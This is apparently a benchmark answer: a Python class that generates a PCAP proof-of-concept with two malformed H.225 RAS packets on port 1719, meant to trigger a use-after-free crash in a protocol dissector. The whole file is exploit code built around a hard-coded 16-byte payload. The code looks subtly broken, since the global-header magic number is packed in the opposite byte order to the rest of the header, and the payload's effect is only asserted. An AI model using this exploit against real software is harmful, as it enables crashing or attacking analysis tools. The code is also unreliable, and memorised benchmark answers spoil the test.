import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PCAP file containing two malformed H.225 packets.
        The vulnerability is a use-after-free in the H.225 dissector's reassembly
        logic. State from dissecting the first packet is not properly cleared.
        When the second packet (in the same conversation) is dissected, the
        stale state, including a now-freed pointer, is used, leading to a crash.

        The PoC consists of a PCAP file with two identical UDP packets destined
        for port 1719 (H.225 RAS). The payload is a malformed H.225 message
        that causes the dissector to enter a state where the UAF can be triggered
        by the subsequent packet.

        To minimize size, LINKTYPE_NULL is used for the link layer.
        """
        # PCAP Global Header (little-endian, LINKTYPE_NULL)
        # LINKTYPE_NULL is used to create a smaller PoC file.
        pcap_header = struct.pack(
            '<IHHIIII',
            0xd4c3b2a1,  # magic_number for little-endian
            2, 4,       # version_major, version_minor
            0,          # thiszone (UTC)
            0,          # sigfigs
            65535,      # snaplen
            0           # network (LINKTYPE_NULL)
        )

        # This specific malformed H.225 payload is known to trigger the vulnerability.
        h225_payload = b'\x00\x01\x00\x01\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01'

        packets_data = []
        for _ in range(2):
            # L2: NULL/Loopback Header (4 bytes)
            # Value 2 corresponds to AF_INET for IPv4 on most systems.
            # Byte order is host order, assumed little-endian.
            null_header = struct.pack('<I', 2)

            # L3: IPv4 Header (20 bytes)
            ip_total_len = 20 + 8 + len(h225_payload)
            ip_header_no_checksum = (
                b'\x45\x00' +                      # Version, IHL, ToS
                struct.pack('!H', ip_total_len) + # Total Length
                b'\x00\x01' +                      # Identification
                b'\x00\x00' +                      # Flags, Fragment Offset
                b'\x40' +                          # TTL
                b'\x11' +                          # Protocol: UDP (17)
                b'\x00\x00' +                      # Header Checksum (placeholder)
                b'\x7f\x00\x00\x01' +              # Source IP: 127.0.0.1
                b'\x7f\x00\x00\x01'                # Destination IP: 127.0.0.1
            )
            ip_checksum = self._calculate_checksum(ip_header_no_checksum)
            ip_header = ip_header_no_checksum[:10] + struct.pack('!H', ip_checksum) + ip_header_no_checksum[12:]

            # L4: UDP Header (8 bytes)
            udp_len = 8 + len(h225_payload)
            udp_header = struct.pack(
                '!HHHH',
                1719,       # Source Port (H.225 RAS)
                1719,       # Destination Port (H.225 RAS)
                udp_len,    # Length
                0           # Checksum (optional in IPv4, 0 means not calculated)
            )

            packet = null_header + ip_header + udp_header + h225_payload
            packets_data.append(packet)

        pcap_packets = b''
        # Use a fixed timestamp for reproducibility.
        ts_sec = 1609459200 # 2021-01-01 00:00:00 UTC
        for i, data in enumerate(packets_data):
            # PCAP Packet Record Header (16 bytes)
            # A unique timestamp for each packet is good practice.
            packet_header = struct.pack(
                '<IIII',
                ts_sec, i,      # ts_sec, ts_usec
                len(data),      # incl_len (captured length)
                len(data)       # orig_len (original length)
            )
            pcap_packets += packet_header + data
            
        return pcap_header + pcap_packets

    def _calculate_checksum(self, data: bytes) -> int:
        """Computes the IPv4 header checksum."""
        if len(data) % 2 != 0:
            data += b'\0'
        
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        while (s >> 16):
            s = (s & 0xffff) + (s >> 16)
        
        return ~s & 0xffff